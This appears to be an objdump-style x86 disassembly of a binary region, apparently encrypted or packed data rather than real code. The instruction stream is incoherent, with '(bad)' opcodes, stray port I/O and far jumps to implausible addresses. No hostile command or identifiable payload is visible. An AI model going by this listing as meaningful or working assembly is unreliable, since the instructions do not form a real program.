  420468:	ror    BYTE PTR [edx+0x78],1
  42046b:	nop
  42046c:	mov    edx,0x96017ab2
  420471:	es jne 0x4204be
  420474:	and    DWORD PTR [edx],esi
  420476:	dec    ebp
  420477:	xor    BYTE PTR [esp+eax*2-0x1c7a0325],cl
  42047e:	lock mov dh,0x6c
  420481:	stc    
  420482:	push   es
  420483:	xchg   BYTE PTR [ebx+eiz*4],bl
  420486:	retf   
  420487:	out    0x29,eax
  420489:	and    BYTE PTR [ebx+0x4e],ch
  42048c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42048e:	fcmovne st,st(7)
  420490:	push   esi
  420491:	daa    
  420492:	cs push esi
  420494:	or     edi,0xea19aab6
  42049a:	xchg   edx,eax
  42049b:	dec    ebx
  42049c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42049d:	mov    eax,ds:0xa6b80c21
  4204a2:	inc    eax
  4204a3:	inc    ebx
  4204a4:	xor    bl,bh
  4204a6:	push   ebp
  4204a7:	iret   
  4204a8:	mov    esi,0x2b201cf8
  4204ad:	outs   dx,BYTE PTR ds:[esi]
  4204ae:	xchg   ebx,eax
  4204af:	sbb    eax,0xd78f30a6
  4204b4:	test   BYTE PTR [ebp+0x13b1369c],0xbf
  4204bb:	jns    0x420469
  4204bd:	add    al,0x31
  4204bf:	mov    eax,0xc4bc423
  4204c4:	add    al,0x3c
  4204c6:	dec    ecx
  4204c7:	pop    ebp
  4204c8:	jge    0x420520
  4204ca:	out    dx,al
  4204cb:	xor    al,0xed
  4204cd:	add    al,0x29
  4204cf:	fs ins BYTE PTR es:[edi],dx
  4204d1:	fidiv  DWORD PTR [edi]
  4204d3:	out    dx,al
  4204d4:	and    al,0xf3
  4204d6:	mov    edi,0x329c6263
  4204db:	pop    es
  4204dc:	in     eax,dx
  4204dd:	sti    
  4204de:	pop    esp
  4204df:	shr    bh,1
  4204e1:	mov    BYTE PTR [edx+esi*1-0x8bca23c],cl
  4204e8:	and    DWORD PTR [ebp+0x328147],ecx
	...
  420556:	scas   al,BYTE PTR es:[edi]
  420557:	xchg   esp,eax
  420558:	push   edi
  420559:	adc    bh,BYTE PTR [edi-0x2d]
  42055c:	out    dx,eax
  42055d:	mov    esp,0x5a7f6c39
  420562:	fcmovb st,st(1)
  420564:	scas   eax,DWORD PTR es:[edi]
  420565:	cmp    ebx,esp
  420567:	pop    edx
  420568:	add    DWORD PTR [eax],eax
  42056a:	inc    DWORD PTR [eax]
  42056c:	add    BYTE PTR [eax],al
  42056e:	mov    ecx,0xd77e7a51
  420573:	shr    BYTE PTR [ebx+0x17],cl
  420576:	mov    esi,0x99ea6a2e
  42057b:	add    eax,0xc3752fea
  420580:	dec    ebx
  420581:	and    al,0x34
  420583:	nop
  420584:	aas    
  420585:	mov    esi,0x42b53db0
  42058a:	or     BYTE PTR [edx-0x21da8a84],al
  420590:	sub    ah,bl
  420592:	lods   eax,DWORD PTR ss:[esi]
  420594:	adc    al,0xe3
  420596:	add    al,0x1e
  420598:	hlt    
  420599:	gs loope 0x42055d
  42059c:	shr    ch,cl
  42059e:	sbb    al,0xe8
  4205a0:	stos   DWORD PTR es:[edi],eax
  4205a1:	jo     0x42052e
  4205a3:	and    dh,BYTE PTR [esi+0x5b2e5932]
  4205a9:	mov    ebp,0x560adfb1
  4205ae:	push   ds
  4205af:	rcl    DWORD PTR [ebp+0xc2e3431],1
  4205b5:	jge    0x4205d7
  4205b7:	jmp    0x80458d14
  4205bc:	add    dh,ah
  4205be:	(bad)  
  4205bf:	sub    bh,bl
  4205c1:	call   0xfdf63209
  4205c6:	push   edi
  4205c7:	cwde   
  4205c8:	jle    0x420647
  4205ca:	dec    esi
  4205cb:	dec    eax
  4205cc:	mov    bl,0x30
  4205ce:	push   edi
  4205cf:	les    esp,FWORD PTR [ebp+0x32]
  4205d2:	ds lahf 
  4205d4:	fmulp  st(6),st
  4205d6:	mov    edi,0x6db12830
  4205db:	push   0x7675f93e
  4205e0:	sbb    bl,BYTE PTR [eax]
  4205e2:	add    eax,0x885d8662
  4205e7:	imul   ebx,DWORD PTR [ebx-0x4f58b22],0x5fc866c8
  4205f1:	test   DWORD PTR [edi+0x76],ebx
  4205f4:	(bad)  
  4205f5:	aaa    
  4205f6:	scas   eax,DWORD PTR es:[edi]
  4205f7:	mov    dh,ah
  4205f9:	out    dx,eax
  4205fa:	in     al,dx
  4205fb:	sti    
  4205fc:	push   es
  4205fd:	ss or  ecx,ebx
  420600:	adc    BYTE PTR [esi-0x41],ah
  420603:	das    
  420604:	imul   ebp,DWORD PTR [ecx+0x63],0x4013472a
  42060b:	mov    al,0xa4
  42060d:	mov    esi,0x2993a168
  420612:	dec    esp
  420613:	pusha  
  420614:	xor    eax,0xeb8595e9
  420619:	popa   
  42061a:	test   BYTE PTR [ebx],dl
  42061c:	xchg   ebp,eax
  42061d:	jmp    0xd0137dbb
  420622:	add    BYTE PTR [edx+edi*1],al
  420625:	shl    BYTE PTR [edx+0x32e231cc],1
  42062b:	dec    DWORD PTR [ebp-0x261a9b18]
  420631:	mov    bl,0x49
  420633:	mov    ds:0x3130c2c6,al
  420638:	adc    esp,ebp
  42063a:	shl    esp,0x4e
  42063d:	xchg   ecx,eax
  42063e:	(bad)  
  420640:	rol    ebx,0xbf
  420643:	mov    cl,0x25
  420645:	aam    0xd8
  420647:	mov    al,0xc3
  420649:	cmp    esi,DWORD PTR [ebp-0x12]
  42064c:	xchg   BYTE PTR [eax-0x69],ch
  42064f:	mov    al,0x58
  420651:	sbb    al,0x2b
  420653:	xchg   ebp,eax
  420654:	push   ebp
  420655:	pop    ds
  420656:	or     al,BYTE PTR [esi]
  420658:	loope  0x4205e4
  42065a:	push   edi
  42065b:	test   al,0x71
  42065d:	dec    ebp
  42065e:	sbb    al,0xb5
  420660:	mov    ebp,0x982b3322
  420665:	(bad)  
  420666:	mov    eax,ds:0x8bc107e
  42066b:	popf   
  42066c:	mov    al,BYTE PTR [eax]
	...
  4206d6:	test   BYTE PTR [eax-0x48],ch
  4206d9:	or     ah,bh
  4206db:	fdiv   DWORD PTR [esp+ebp*8+0x78d500c5]
  4206e2:	mov    ah,0x14
  4206e4:	jecxz  0x420666
  4206e6:	loop   0x420743
  4206e8:	add    DWORD PTR [eax],eax
  4206ea:	inc    DWORD PTR [eax]
  4206ec:	add    BYTE PTR [eax],al
  4206ee:	mov    BYTE PTR [eax],dh
  4206f0:	sar    BYTE PTR [ebp+0x711f8a1e],cl
  4206f6:	and    eax,0x7337f267
  4206fb:	dec    eax
  4206fc:	xchg   esp,eax
  4206fd:	ins    BYTE PTR es:[edi],dx
  4206fe:	pop    esi
  4206ff:	xor    eax,0x9a950a67
  420704:	ror    bh,cl
  420706:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420707:	pop    es
  420708:	mov    bh,cl
  42070a:	sahf   
  42070b:	cld    
  42070c:	xchg   eax,ebx
  42070e:	and    al,0x49
  420710:	jecxz  0x420723
  420712:	iret   
  420713:	test   DWORD PTR [edx+ebx*2],esp
  420716:	mov    esp,0x74e64ada
  42071b:	es dec esp
  42071d:	jg     0x4206cc
  42071f:	dec    edi
  420720:	pop    edx
  420721:	test   esp,0x7fe39fa8
  420727:	sub    edi,DWORD PTR [ecx-0x121fe8e5]
  42072d:	inc    esi
  42072e:	inc    ecx
  42072f:	out    0xf6,eax
  420731:	mov    bl,0x2c
  420733:	popa   
  420734:	inc    esi
  420735:	adc    eax,0xd173ade3
  42073a:	cs fnclex 
  42073d:	inc    ebx
  42073e:	push   ecx
  42073f:	retf   
  420740:	mov    cl,0x63
  420742:	enter  0x4d72,0x2d
  420746:	cmp    BYTE PTR [edi+0x1b],bh
  420749:	push   es
  42074a:	(bad)  
  42074b:	out    dx,al
  42074c:	cmovp  ecx,DWORD PTR [ecx-0x67]
  420750:	and    al,0xe2
  420752:	push   gs
  420754:	fs in  eax,0x6a
  420757:	ffree  st(2)
  420759:	sbb    edx,0x43
  42075c:	fbstp  TBYTE PTR [eax-0x598945b7]
  420762:	jo     0x420713
  420764:	imul   edi,DWORD PTR [ecx+0x3e13c295],0x2f28231c
  42076e:	mov    edx,0x355d4e80
  420773:	loop   0x4207eb
  420775:	xchg   esp,eax
  420776:	add    ebp,eax
  420778:	mov    ds:0xf439573a,al
  42077d:	(bad)  
  42077e:	lods   al,BYTE PTR ds:[esi]
  42077f:	adc    bl,ch
  420781:	jp     0x4207b8
  420783:	loope  0x420778
  420785:	lods   eax,DWORD PTR ds:[esi]
  420786:	sub    BYTE PTR ds:0x7bdbe929,0x5d
  42078d:	test   DWORD PTR cs:[esp+edx*1+0xc],edi
  420792:	jp     0x42080e
  420794:	mov    edx,0xa5e698ff
  420799:	push   esp
  42079a:	jmp    0x2578f940
  42079f:	iret   
  4207a0:	lahf   
  4207a1:	push   edx
  4207a2:	or     cl,BYTE PTR [ecx+0x19d36e53]
  4207a8:	das    
  4207a9:	xor    bh,bl
  4207ab:	pop    edi
  4207ac:	adc    edx,DWORD PTR [esi]
  4207ae:	cwde   
  4207af:	sub    BYTE PTR [edx],al
  4207b1:	jno    0x4207b6
  4207b3:	mov    esp,0x3a662d33
  4207b8:	xor    eax,0xdcf38cc5
  4207be:	push   0x64
  4207c0:	ror    dh,1
  4207c2:	mov    dl,0xe5
  4207c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207c6:	fadd   DWORD PTR [ecx]
  4207c8:	ins    BYTE PTR es:[edi],dx
  4207c9:	iret   
  4207ca:	sbb    bh,BYTE PTR [ebp+eax*2-0x40b3a68b]
  4207d1:	sahf   
  4207d2:	push   esi
  4207d3:	push   ebp
  4207d4:	scas   eax,DWORD PTR es:[edi]
  4207d5:	pop    edi
  4207d6:	dec    edx
  4207d7:	sbb    BYTE PTR [ebx-0xb],dl
  4207da:	mov    DWORD PTR [ebx+0x45be6693],edx
  4207e0:	xchg   edi,eax
  4207e1:	sar    ebx,cl
  4207e3:	pop    eax
  4207e4:	mov    ebx,0x643d77de
  4207e9:	and    dh,BYTE PTR [edi-0x5f]
  4207ec:	dec    ebp
	...
  420855:	add    BYTE PTR [ecx-0x587fdad1],cl
  42085b:	mov    ch,BYTE PTR [ebp-0x2390c6d1]
  420861:	pusha  
  420862:	shr    BYTE PTR [esi-0x2f],cl
  420865:	jnp    0x420848
  420867:	pop    esp
  420868:	add    DWORD PTR [eax],eax
  42086a:	inc    DWORD PTR [eax]
  42086c:	add    BYTE PTR [eax],al
  42086e:	sub    esi,edi
  420870:	xchg   esp,eax
  420871:	aaa    
  420872:	mov    esi,esi
  420874:	in     eax,0xcf
  420876:	dec    edi
  420877:	lahf   
  420878:	mov    cl,0x50
  42087a:	jbe    0x4208ce
  42087c:	mov    DWORD PTR [eax+0x14],ebp
  42087f:	js     0x42083a
  420881:	int3   
  420882:	push   ss
  420883:	ins    DWORD PTR es:[edi],dx
  420884:	add    edx,DWORD PTR [edx-0x16]
  420887:	mov    eax,0x98d2f971
  42088c:	cli    
  42088d:	lds    edx,FWORD PTR [edi-0x7]
  420890:	inc    eax
  420891:	jno    0x4208b4
  420893:	mov    edi,0x71ef7475
  420898:	and    al,0xb1
  42089a:	cs aad 0xb9
  42089d:	add    BYTE PTR [edx],dh
  42089f:	stc    
  4208a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208a1:	cs inc esp
  4208a3:	ficom  DWORD PTR [esi-0x56d767b8]
  4208a9:	inc    ebp
  4208aa:	add    BYTE PTR [edx+0x5b33919b],bh
  4208b0:	repnz inc edx
  4208b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208b3:	aam    0xd1
  4208b5:	sub    ah,bh
  4208b7:	sub    eax,0x55b189c9
  4208bc:	test   al,0x5f
  4208be:	in     eax,0x9c
  4208c0:	shl    ch,1
  4208c2:	std    
  4208c3:	aaa    
  4208c4:	jae    0x420894
  4208c6:	adc    esi,0xffffffc5
  4208c9:	and    DWORD PTR [edi+0x54],edx
  4208cc:	sbb    DWORD PTR [esi],eax
  4208ce:	sbb    BYTE PTR [eax-0x60940ade],bl
  4208d4:	test   eax,0x668f7f55
  4208d9:	inc    ecx
  4208da:	push   cs
  4208db:	in     eax,dx
  4208dc:	push   ds
  4208dd:	or     DWORD PTR [edi+0x76f19826],ecx
  4208e3:	lods   eax,DWORD PTR ds:[esi]
  4208e4:	std    
  4208e5:	cli    
  4208e6:	pushf  
  4208e7:	mov    fs,WORD PTR [ecx+0xf]
  4208ea:	dec    eax
  4208eb:	dec    edx
  4208ec:	sub    DWORD PTR [eax+ecx*4+0x71],ecx
  4208f0:	iret   
  4208f1:	mov    ebx,es
  4208f3:	call   0xf746:0x591e87b6
  4208fa:	stos   DWORD PTR es:[edi],eax
  4208fb:	or     eax,0xf25c04c1
  420900:	sub    DWORD PTR [esi-0x6d],esp
  420903:	jmp    0x5980625
  420908:	cmc    
  420909:	test   ebx,esp
  42090b:	xchg   ch,bl
  42090d:	sub    BYTE PTR [edx+0x13],dl
  420910:	ins    DWORD PTR es:[edi],dx
  420911:	xlat   BYTE PTR ds:[ebx]
  420912:	or     BYTE PTR [esi+0x6361c01],al
  420918:	lea    edi,[edi+ebx*4-0x7c2f045e]
  42091f:	push   ds
  420920:	push   edi
  420921:	push   esi
  420922:	shl    BYTE PTR [ebx],0xf3
  420925:	gs es loopne 0x4208f3
  420929:	mov    edx,0xdb9b82d5
  42092e:	push   edx
  42092f:	cli    
  420930:	xchg   ah,dl
  420932:	push   edi
  420933:	xor    DWORD PTR ds:0xee4cfc8e,esi
  420939:	and    al,0x1b
  42093b:	in     eax,0x4a
  42093d:	mov    DWORD PTR [ecx+0x310838ab],ebx
  420943:	das    
  420944:	or     al,0x50
  420946:	adc    bh,0xa5
  420949:	xor    ah,BYTE PTR [eax+esi*1]
  42094c:	iret   
  42094d:	icebp  
  42094e:	inc    ebp
  42094f:	fistp  DWORD PTR ds:0xad4e7105
  420955:	add    DWORD PTR [esi],0x7d
  420958:	jbe    0x4209ab
  42095a:	sti    
  42095b:	adc    eax,0xeca9475
  420960:	aaa    
  420961:	je     0x4209c8
  420963:	add    eax,0xebf5fa2f
  420968:	dec    eax
  420969:	dec    ecx
  42096a:	adc    ch,BYTE PTR [eax+0xbf]
	...
  4209d4:	add    BYTE PTR [eax],al
  4209d6:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  4209dd:	mov    ch,0xd2
  4209df:	ja     0x420a3f
  4209e1:	mov    dh,0x68
  4209e3:	jns    0x4209d0
  4209e5:	dec    ecx
  4209e6:	loopne 0x420a45
  4209e8:	add    DWORD PTR [eax],eax
  4209ea:	inc    DWORD PTR [eax]
  4209ec:	add    BYTE PTR [eax],al
  4209ee:	jmp    0x420a54
  4209f0:	or     bh,0x5b
  4209f3:	inc    ebp
  4209f4:	nop
  4209f5:	and    ecx,ebx
  4209f7:	ss inc eax
  4209f9:	cmp    cl,BYTE PTR [esi-0x5107591c]
  4209ff:	and    ecx,esp
  420a01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a02:	imul   ecx,DWORD PTR [edi+edi*8-0x3ee9c725],0x85e48df8
  420a0d:	iret   
  420a0e:	rcr    DWORD PTR [eax],cl
  420a10:	loop   0x4209ca
  420a12:	ds xchg edi,eax
  420a14:	outs   dx,BYTE PTR ds:[esi]
  420a15:	fnstenv [edx+0x20]
  420a18:	out    dx,al
  420a19:	adc    esp,eax
  420a1b:	fisub  DWORD PTR [edi+ecx*2]
  420a1e:	fist   DWORD PTR [ecx+0x1d]
  420a21:	bnd jo 0x420a40
  420a24:	mov    eax,ds:0x8f14f173
  420a29:	nop
  420a2a:	jns    0x420a63
  420a2c:	xor    DWORD PTR [ecx+eiz*2+0x23],0x4f
  420a31:	int3   
  420a32:	(bad)  [eax]
  420a34:	into   
  420a35:	je     0x420a76
  420a37:	call   0xc7aa4580
  420a3c:	ret    
  420a3d:	push   cs
  420a3e:	imul   edi,DWORD PTR [esi],0x5e
  420a41:	push   edi
  420a42:	cli    
  420a43:	and    DWORD PTR [ebp+0x35],edi
  420a46:	mov    ecx,0xb367ae1f
  420a4b:	and    al,BYTE PTR [ebp-0x2a]
  420a4e:	int    0x60
  420a50:	dec    eax
  420a51:	fbstp  TBYTE PTR [eax+0x6c]
  420a54:	or     ah,ch
  420a56:	xchg   ecx,eax
  420a57:	jp     0x420aa6
  420a59:	mov    WORD PTR [ecx],gs
  420a5b:	ins    BYTE PTR es:[edi],dx
  420a5c:	(bad)  
  420a5e:	dec    eax
  420a5f:	or     edx,DWORD PTR [esi+0x24bb8554]
  420a65:	and    eax,0x4601f09a
  420a6a:	daa    
  420a6b:	mov    eax,0x627a7590
  420a70:	adc    DWORD PTR [ebx+0x54],ebx
  420a73:	retf   
  420a74:	and    DWORD PTR [ebx+0x5c],ebx
  420a77:	imul   ebp,DWORD PTR [ebp-0x2e],0xe8caf31c
  420a7e:	adc    bl,BYTE PTR [edx+0x700c2385]
  420a84:	mov    WORD PTR es:[ebx],ds
  420a87:	inc    ecx
  420a88:	sbb    eax,0x8846c72b
  420a8d:	mov    ebx,DWORD PTR [edx]
  420a8f:	sbb    dl,bh
  420a91:	neg    ebx
  420a93:	jmp    0x8d64:0x6d0b0193
  420a9a:	xchg   ebp,eax
  420a9b:	sub    ecx,DWORD PTR [eax+0x6b]
  420a9e:	les    edi,FWORD PTR [eax-0x6a5d7eb9]
  420aa4:	in     eax,dx
  420aa5:	push   ecx
  420aa6:	int3   
  420aa7:	mov    ebp,fs
  420aa9:	stos   DWORD PTR es:[edi],eax
  420aaa:	mov    edx,0xbd43644e
  420aaf:	in     al,0x1f
  420ab1:	outs   dx,BYTE PTR ds:[esi]
  420ab2:	dec    esp
  420ab3:	fs mov ebx,0xb4565aab
  420ab9:	aaa    
  420aba:	dec    ecx
  420abb:	mov    al,0x93
  420abd:	fadd   QWORD PTR [edi-0x76ec0a13]
  420ac3:	add    BYTE PTR [esp+eiz*4+0x6b],dl
  420ac7:	push   ds
  420ac8:	mov    ?,WORD PTR [eax-0x5c487ef0]
  420ace:	nop
  420acf:	stc    
  420ad0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ad1:	mov    edi,0xae19a1a4
  420ad6:	pop    es
  420ad7:	(bad)  
  420ad8:	fadd   DWORD PTR [ecx+edx*8+0x196d0d4b]
  420adf:	cmc    
  420ae0:	sub    eax,0x7b97877e
  420ae5:	js     0x420b48
  420ae7:	lock (bad) 
  420ae9:	in     al,0x9b
  420aeb:	lods   al,BYTE PTR ds:[esi]
  420aec:	jo     0x420aee
	...
  420b56:	fbstp  TBYTE PTR [edx]
  420b58:	scas   eax,DWORD PTR es:[edi]
  420b59:	adc    ebp,edi
  420b5b:	lahf   
  420b5c:	(bad)  
  420b5d:	(bad)  
  420b5e:	xlat   BYTE PTR ds:[ebx]
  420b5f:	out    dx,eax
  420b60:	(bad)  
  420b61:	cld    
  420b62:	int    0x32
  420b64:	popa   
  420b65:	jge    0x420b46
  420b67:	pop    esi
  420b68:	add    DWORD PTR [eax],eax
  420b6a:	inc    DWORD PTR [eax]
  420b6c:	add    BYTE PTR [eax],al
  420b6e:	sub    DWORD PTR [esi+0x5ddc60c0],ebx
  420b74:	xchg   edi,eax
  420b75:	repz dec eax
  420b77:	pushf  
  420b78:	or     DWORD PTR [ebx+ecx*4],edi
  420b7b:	push   edx
  420b7c:	loope  0x420ba6
  420b7e:	adc    BYTE PTR ds:0x6bbe290c,ah
  420b84:	mov    esi,0xaf91d2c6
  420b89:	xchg   BYTE PTR [edx],bh
  420b8b:	jb     0x420bcc
  420b8d:	lods   al,BYTE PTR ds:[esi]
  420b8e:	rcr    DWORD PTR [esi+edi*2-0x1091a19b],cl
  420b95:	in     al,dx
  420b96:	nop
  420b97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b98:	adc    DWORD PTR [esi+0x1f],0x770e654f
  420b9f:	sbb    al,0x6a
  420ba1:	in     al,0xff
  420ba3:	adc    bl,bl
  420ba5:	jne    0x420bf1
  420ba7:	mov    cl,0xae
  420ba9:	repnz cdq 
  420bab:	lods   al,BYTE PTR ds:[esi]
  420bac:	(bad)  
  420bad:	sbb    BYTE PTR [esi+eax*2+0x5c],cl
  420bb1:	int    0xc9
  420bb3:	and    al,0xc4
  420bb5:	clc    
  420bb6:	jne    0x420bea
  420bb8:	ins    BYTE PTR es:[edi],dx
  420bb9:	ret    0xd091
  420bbc:	or     eax,0x1da817f4
  420bc1:	and    bl,0xe2
  420bc4:	daa    
  420bc5:	sub    DWORD PTR [ebx-0x267bd45f],ebx
  420bcb:	mov    cl,0x79
  420bcd:	push   0x67
  420bcf:	xchg   esp,eax
  420bd0:	cmp    ch,BYTE PTR [edx]
  420bd2:	jp     0x420c11
  420bd4:	mov    ss,WORD PTR [edi+0x56bbcc59]
  420bda:	mov    bh,0xdb
  420bdc:	sar    DWORD PTR [edi+0x7615184e],1
  420be2:	push   0xfffffff5
  420be4:	ja     0x420c60
  420be6:	dec    esp
  420be7:	mov    edx,0x112219b5
  420bec:	cmp    dl,ch
  420bee:	out    0xdc,al
  420bf0:	test   al,0x33
  420bf2:	mov    WORD PTR [edi-0x2d],es
  420bf5:	mov    al,ds:0xa34cb082
  420bfa:	cwde   
  420bfb:	or     esp,DWORD PTR [edx-0x7c66acff]
  420c01:	(bad)  
  420c02:	out    0x1c,eax
  420c04:	push   esp
  420c05:	jge    0x420bf6
  420c07:	mov    dh,0x57
  420c09:	jl     0x420bb6
  420c0b:	jl     0x420bd0
  420c0d:	cmc    
  420c0e:	sub    dl,dl
  420c10:	arpl   WORD PTR [esi],cx
  420c12:	fwait
  420c13:	repz add ecx,ebx
  420c16:	ret    
  420c17:	lds    ebx,FWORD PTR ds:0xa2c62c62
  420c1d:	sbb    BYTE PTR [ecx],al
  420c1f:	sub    DWORD PTR [edi-0x68507bbc],ebx
  420c25:	or     ecx,DWORD PTR [ebx+0x4e]
  420c28:	sub    al,0xdd
  420c2a:	cwde   
  420c2b:	test   DWORD PTR [edx+edx*8+0x79],ebx
  420c2f:	pop    ebp
  420c30:	ret    0xc252
  420c33:	push   0x1f
  420c35:	sub    BYTE PTR ss:[edi+0x45],dh
  420c39:	out    0xb4,al
  420c3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c3c:	add    BYTE PTR [ebp+0x23],bl
  420c3f:	xlat   BYTE PTR ds:[ebx]
  420c40:	xchg   ch,bh
  420c42:	call   0x66ef993a
  420c47:	cmp    eax,ecx
  420c49:	js     0x420c93
  420c4b:	lock cs jecxz 0x420c98
  420c4f:	daa    
  420c50:	xor    al,0x69
  420c52:	out    0xb5,al
  420c54:	xor    BYTE PTR [ebp-0x6fe52026],dl
  420c5a:	sbb    ebx,ebp
  420c5c:	jmp    DWORD PTR [esi]
  420c5e:	mov    gs,WORD PTR [ecx]
  420c60:	xlat   BYTE PTR ds:[ebx]
  420c61:	and    DWORD PTR [eax-0x4d],0x1d4632d4
  420c68:	xchg   DWORD PTR [ebp+0x8d7282],eax
	...
  420cd6:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420cdc:	mov    edx,0x1886e3f
  420ce1:	in     eax,0x6f
  420ce3:	ror    DWORD PTR [ecx+0x15fdee2],1
  420ce9:	add    bh,bh
  420ceb:	add    BYTE PTR [eax],al
  420ced:	add    ch,dl
  420cef:	int3   
  420cf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cf1:	jae    0x420cbd
  420cf3:	and    al,0x2
  420cf5:	xchg   ebp,eax
  420cf6:	push   edx
  420cf7:	jge    0x420d17
  420cf9:	xor    ecx,DWORD PTR [edi-0x41]
  420cfc:	dec    edx
  420cfd:	(bad)  
  420cfe:	(bad)  
  420cff:	xchg   esp,eax
  420d00:	out    dx,al
  420d01:	test   BYTE PTR [edx+ecx*8],0xea
  420d05:	sub    cl,al
  420d07:	mov    esp,0x474012ee
  420d0c:	sub    BYTE PTR [ecx-0x63ec70cf],dh
  420d12:	rcr    BYTE PTR [ecx+0x4f79614],1
  420d18:	dec    ebp
  420d19:	sbb    al,0x2d
  420d1b:	out    0x78,al
  420d1d:	addr16 jg 0x420d64
  420d20:	nop
  420d21:	xor    al,0x51
  420d23:	add    al,BYTE PTR ds:0x791a4533
  420d29:	stc    
  420d2a:	(bad)  
  420d2b:	xchg   esp,eax
  420d2c:	cmp    DWORD PTR [edi],esi
  420d2e:	sub    edx,DWORD PTR [edi]
  420d30:	hlt    
  420d31:	mov    al,ds:0x6350cc5d
  420d36:	inc    esi
  420d37:	mov    al,0x8
  420d39:	leave  
  420d3a:	or     BYTE PTR [ecx-0x7ce1a6af],ch
  420d40:	(bad)  
  420d41:	ins    DWORD PTR es:[edi],dx
  420d42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d43:	xchg   ebx,eax
  420d44:	xchg   edi,eax
  420d45:	push   edx
  420d46:	aam    0x5f
  420d48:	and    al,0x6e
  420d4a:	sub    eax,DWORD PTR [esi+0x22]
  420d4d:	cmp    DWORD PTR [eax],eax
  420d4f:	repz fisttp DWORD PTR [edi-0x9]
  420d53:	popf   
  420d54:	push   0xffffffb4
  420d56:	push   esp
  420d57:	or     eax,0x97d9aad0
  420d5c:	and    ch,BYTE PTR [esi]
  420d5e:	mul    BYTE PTR cs:[ecx]
  420d61:	mov    ebx,0x1546a918
  420d66:	mov    edx,0x2ed2ec07
  420d6b:	fld    TBYTE PTR [ecx-0x2907b108]
  420d71:	pop    edx
  420d72:	mov    WORD PTR [edx-0x7e09f5e6],ss
  420d78:	push   ecx
  420d79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d7a:	inc    esp
  420d7b:	ret    
  420d7c:	xor    eax,0xffffffcb
  420d7f:	dec    edi
  420d80:	je     0x420de0
  420d82:	mov    edx,DWORD PTR [ebx+0x43f42bd5]
  420d88:	inc    edi
  420d89:	(bad)  
  420d8a:	in     eax,0x3e
  420d8c:	aam    0x62
  420d8e:	xor    BYTE PTR [ebx-0x64584ffc],ah
  420d94:	das    
  420d95:	loope  0x420d4d
  420d97:	add    eax,esp
  420d99:	lods   al,BYTE PTR ds:[esi]
  420d9a:	ins    BYTE PTR es:[edi],dx
  420d9b:	loope  0x420db4
  420d9d:	aas    
  420d9e:	jb     0x420d7e
  420da0:	mov    ch,BYTE PTR [edi+0xb]
  420da3:	mov    edx,0xfd88079b
  420da8:	cdq    
  420da9:	xchg   esi,eax
  420daa:	sub    ebp,edx
  420dac:	sub    DWORD PTR [edx],0xffffffae
  420daf:	mov    ebp,0x4e172726
  420db4:	adc    eax,DWORD PTR [edi]
  420db6:	sbb    ch,dl
  420db8:	push   0xbcac14e6
  420dbd:	sbb    dl,BYTE PTR [esi]
  420dbf:	loope  0x420e28
  420dc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420dc2:	inc    eax
  420dc3:	inc    edx
  420dc4:	je     0x420df8
  420dc6:	inc    edi
  420dc7:	fstp   DWORD PTR fs:[edi+0x5e34f978]
  420dce:	add    dh,ah
  420dd0:	dec    ecx
  420dd1:	pop    es
  420dd2:	cmp    BYTE PTR [ebx+ebp*1+0x46305cb5],ah
  420dd9:	jo     0x420d9a
  420ddb:	xor    al,0x98
  420ddd:	sar    DWORD PTR [esi],1
  420ddf:	cld    
  420de0:	push   ebp
  420de1:	hlt    
  420de2:	test   al,0xff
  420de4:	mov    dh,0x7d
  420de6:	sub    al,dl
  420de8:	dec    esp
  420de9:	aad    0x45
  420deb:	and    edx,DWORD PTR [eax+eax*1]
	...
  420e56:	out    0x1e,eax
  420e58:	into   
  420e59:	push   0x9fe7f8ff
  420e5e:	push   esi
  420e5f:	inc    edi
  420e60:	lahf   
  420e61:	mov    al,ds:0xefa0f217
  420e66:	frstor [eax+0x1]
  420e69:	add    bh,bh
  420e6b:	add    BYTE PTR [eax],al
  420e6d:	add    dl,dh
  420e6f:	xchg   BYTE PTR [eax+0x5f123f96],ch
  420e75:	jmp    0x7d30:0x89e5615f
  420e7c:	sti    
  420e7d:	fist   DWORD PTR [ecx]
  420e7f:	push   ecx
  420e80:	mov    ah,0x9f
  420e82:	inc    ebx
  420e83:	int3   
  420e84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e85:	shl    eax,cl
  420e87:	dec    ebx
  420e88:	fsub   DWORD PTR es:[ecx]
  420e8b:	dec    ebx
  420e8c:	es repnz stos BYTE PTR es:[di],al
  420e90:	cmc    
  420e91:	(bad)  
  420e92:	aaa    
  420e93:	inc    ebp
  420e94:	xchg   edx,eax
  420e95:	pop    eax
  420e96:	addr16 cs mov ebx,0x947b6259
  420e9d:	test   al,0xd6
  420e9f:	pop    ebx
  420ea0:	adc    BYTE PTR [esi],ah
  420ea2:	ja     0x420eec
  420ea4:	retf   0x88b8
  420ea7:	xchg   DWORD PTR [edi],esi
  420ea9:	mov    dl,0x2e
  420eab:	xchg   DWORD PTR [edx-0x46],edi
  420eae:	or     BYTE PTR [edi+0x13],0x5e
  420eb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420eb3:	test   DWORD PTR [eax],0xde8b4ac8
  420eb9:	sub    dl,BYTE PTR [eax-0x24578247]
  420ebf:	add    BYTE PTR [ebp-0x51],dh
  420ec2:	mov    bh,0xe6
  420ec4:	cs pop edx
  420ec6:	lea    esi,ds:0xddc7e933
  420ecc:	sbb    eax,0xd8b8d437
  420ed1:	jne    0x420e78
  420ed3:	add    DWORD PTR [ebp+0x61d56d38],0xffffff8f
  420eda:	add    cl,bl
  420edc:	aaa    
  420edd:	rcr    al,0xb8
  420ee0:	dec    eax
